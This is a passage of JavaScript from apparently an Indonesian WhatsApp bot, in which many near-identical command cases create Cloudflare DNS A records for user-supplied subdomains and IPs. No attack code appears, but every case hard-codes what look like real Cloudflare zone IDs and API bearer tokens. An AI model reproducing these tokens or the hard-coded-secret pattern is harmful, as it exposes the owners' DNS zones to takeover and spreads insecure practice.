           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By Raff Offcial_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
break 

case 'domain25': {
    if (!isOwner) return m.reply("maaf su fitur ini dapet di gunakan group tertentu")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "a6c9cf9cd38077e52db6874200c5c0c4";
               let apitoken = "DyQW84WhtZwTfWZCanO-MQNd6gglRwDHOmK8KRF2";
               let tld = "panellku.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`┏━━━━━━━━━━━━━━━━━━━
┣ Ip = ${e['ip']}
┗━━━━━━━━━━━━━━━━━━━
┣ Username = ${e['name']}
┗━━━━━━━━━━━━━━━━━━━
┣ crate by = ${author}
┗━━━━━━━━━━━━━━━━━━━`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
   case 'domain26': {
    if (!isOwner) return m.reply("maaf su fitur ini dapet di gunakan group tertentu")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "512f917ecb9e0d4eb0085458fdcc95ee";
               let apitoken = "a4hizwK6UjIi8MBEscAOVNG-njTDfJejAhOJlOFh";
               let tld = "panellku.me";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`┏━━━━━━━━━━━━━━━━━━━
┣ Ip = ${e['ip']}
┗━━━━━━━━━━━━━━━━━━━
┣ Username = ${e['name']}
┗━━━━━━━━━━━━━━━━━━━
┣ crate by = ${author}
┗━━━━━━━━━━━━━━━━━━━`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break   
    case 'domain27': {
    if (!isOwner) return m.reply("maaf su fitur ini dapet di gunakan group tertentu")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "b268933cdea4ffd662bc56dd84e46e21";
               let apitoken = "v80Y6QMWDamHAg-u18z8IEMBp1kpodn_lZkyduJ8";
               let tld = "panellku.biz.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`┏━━━━━━━━━━━━━━━━━━━
┣ Ip = ${e['ip']}
┗━━━━━━━━━━━━━━━━━━━
┣ Username = ${e['name']}
┗━━━━━━━━━━━━━━━━━━━
┣ crate by = ${author}
┗━━━━━━━━━━━━━━━━━━━`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break   
     case 'domain28': {
    if (!isOwner) return m.reply("maaf su fitur ini dapet di gunakan group tertentu")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "4e1c19a2687fe1a2505fecaf3de3e7ff";
               let apitoken = "p4oS8J-Tc0Rt9z4tgS3gdzbaG-aL0FQ0Ro1mpl-Q";
               let tld = "panellku.tech";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`┏━━━━━━━━━━━━━━━━━━━
┣ Ip = ${e['ip']}
┗━━━━━━━━━━━━━━━━━━━
┣ Username = ${e['name']}
┗━━━━━━━━━━━━━━━━━━━
┣ crate by = ${author}
┗━━━━━━━━━━━━━━━━━━━`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break        
         case 'domain29': {
    if (!isOwner) return m.reply("maaf su fitur ini dapet di gunakan group tertentu")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "72fc614619292a5d6c86d3e736b14062";
               let apitoken = "MF2cgyOmXeFdrwpcTS4XRbYbDL9zsmF6XY6TIFlv";
               let tld = "panelkuu.xyz";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`┏━━━━━━━━━━━━━━━━━━━
┣ Ip = ${e['ip']}
┗━━━━━━━━━━━━━━━━━━━
┣ Username = ${e['name']}
┗━━━━━━━━━━━━━━━━━━━
┣ crate by = ${author}
┗━━━━━━━━━━━━━━━━━━━`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain30': {
    if (!isOwner) return m.reply("maaf su fitur ini dapet di gunakan group tertentu")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "c8a876bc10af3ce5ab11f2209121cf63";
               let apitoken = "O8uR00EP6u4Rp9TtmwCSASwfkEHAIaNw2DVmIgAD";
               let tld = "panellku.com";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`┏━━━━━━━━━━━━━━━━━━━
┣ Ip = ${e['ip']}
┗━━━━━━━━━━━━━━━━━━━
┣ Username = ${e['name']}
┗━━━━━━━━━━━━━━━━━━━
┣ crate by = ${author}
┗━━━━━━━━━━━━━━━━━━━`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain31': {
    if (!isOwner) return m.reply("maaf su fitur ini dapet di gunakan group tertentu")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "ecfab91669cd9f1f269ff910ef37c4bc";
               let apitoken = "OwvvvI_MTLmsl2O5NnlzvPOfJfkNJlU2IAwA3wGH";
               let tld = "biistoreee.tech";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`berhasil menambah domain\nip: ${e['ip']}\nhostname: ${e['name']}`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain32': {
    if (!jangan) return m.reply("maaf su fitur ini dapet di gunakan group tertentu")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "6e54db622bb8682bdf42316953b5401d";
               let apitoken = "OwvvvI_MTLmsl2O5NnlzvPOfJfkNJlU2IAwA3wGH";
               let tld = "biistoreee.xyz";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`berhasil menambah domain\nip: ${e['ip']}\nhostname: ${e['name']}`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
	case 'domain33': {
    if (!isOwner) return m.reply("maaf su fitur ini dapet di gunakan group tertentu")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "601cbd78e8141e5ffa37e5bcac5f1e00";
               let apitoken = "TXXi3Cz2NusjfQ4_KStk-mc-IaIKzCj_sINwPLm";
               let tld = "rulzxyxd.com";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`berhasil menambah domain\nip: ${e['ip']}\nhostname: ${e['name']}`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
case 'domain34': case 'domain35': {
     if (!jangan) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
     }
     break
          case 'domain36': {
    if (!jangan) return m.reply("Fitur Ini Khusus Untuk Reseller Subdomain RIDZ STORE\nMau Join? Cuman 5.000 Ajaa\n\nHubungi Wa.me/62895354709030")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "44379cef53cb4d8b5e28c11d28efff19";
               let apitoken = "9OAjUqNDxN0EohV6BUh3AROVbLjiYwdzcp_0gGU1";
               let tld = "rizalshop.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By RIDZ STORE⚡_*`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
          case 'domain37': {
    if (!jangan) return m.reply("Fitur Ini Khusus Untuk Reseller Subdomain RIDZ STORE\nMau Join? Cuman 5.000 Ajaa\n\nHubungi Wa.me/62895354709030")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "e0f9412065e53bd57bde671aa36345a9";
               let apitoken = "MDVzjxiioRJ9uO8UnGuvqIIcahrstb-mjlgECNbw";
               let tld = "panelku.link";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By RIDZ STORE⚡_*`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
          case 'domain38': {
    if (!jangan) return m.reply("Fitur Ini Khusus Untuk Reseller Subdomain TDS4YOU\nMau Join? Cuman 5.000 Ajaa\n\nHubungi Wa.me/62895354709030")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "74fc380e8c21521fdb09363ae57b8b92";
               let apitoken = "xGFeJ0uxY6G8xQKnpwDKKFpz_2umbCwddUSsNZEx";
               let tld = "sanzyy.xyz";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By RIDZ STORE⚡_*`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
            break
          case 'domain39': {
    if (!jangan) return m.reply("Fitur Ini Khusus Untuk Reseller Subdomain RIDZ STORE\nMau Join? Cuman 5.000 Ajaa\n\nHubungi Wa.me/62895354709030")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "0aec98100985db6fa9390b8983c1e9b8";
               let apitoken = "9OAjUqNDxN0EohV6BUh3AROVbLjiYwdzcp_0gGU1";
               let tld = "home-panel.pw";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By RIDZ STORE⚡_*`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
          case 'domain40': {
    if (!jangan) return m.reply("Fitur Ini Khusus Untuk Reseller Subdomain RIDZ STORE\nMau Join? Cuman 5.000 Ajaa\n\nHubungi Wa.me/62895354709030 id")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "80eccb8365dd03f4cd3408ed221f0a30";
               let apitoken = "UiM1CzcdcAYE_0wK1cv6nknLhR83lLywzzGQ5Q3r";
               let tld = "aswinxd.me";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By RIDZ STORE⚡_*`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
          case 'domain41': {
    if (!jangan) return m.reply("Fitur Ini Khusus Untuk Reseller Subdomain RIDZ STORE\nMau Join? Cuman 5.000 Ajaa\n\nHubungi Wa.me/62895354709030")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "433a5c33932fa9ae50165c9df5e15f0e";
               let apitoken = "9OAjUqNDxN0EohV6BUh3AROVbLjiYwdzcp_0gGU1";
               let tld = "panel-zall.me";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By RIDZ STORE⚡_*`);
